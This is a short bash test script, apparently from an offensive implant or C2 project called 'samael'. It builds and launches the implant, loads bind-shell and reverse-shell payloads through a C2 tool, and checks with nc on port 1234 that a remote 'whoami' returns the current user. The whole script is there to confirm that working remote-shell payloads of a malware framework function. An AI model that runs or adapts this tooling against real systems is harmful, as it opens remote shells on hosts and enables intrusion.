#!/usr/bin/env bash
user=$(whoami) > /dev/null
killall test 2> /dev/null
cd ../
make clean > /dev/null
make > /dev/null
cd src/
./samael > /dev/null

./test > /dev/null
../tools/c2/c2 ../payloads/bind_shell.so
output=$(echo -e "whoami \n exit" | nc localhost 1234)
if [ "$output" != "$user" ]
then
    echo "Bind Shell Test Failed"
else
    echo "Bind Shell Test Passed"
fi

sleep 60
killall test 2> /dev/null
./test > /dev/null
../tools/c2/c2 ../payloads/reverse_shell.so
output=$((echo -e "whoami \n exit" | nc -lp 1234 ) 2> /dev/null)
if [ "$output" != "$user" ]
then
    echo "Reverse Shell Test Failed"
else
    echo "Reverse Shell Test Passed"
fi
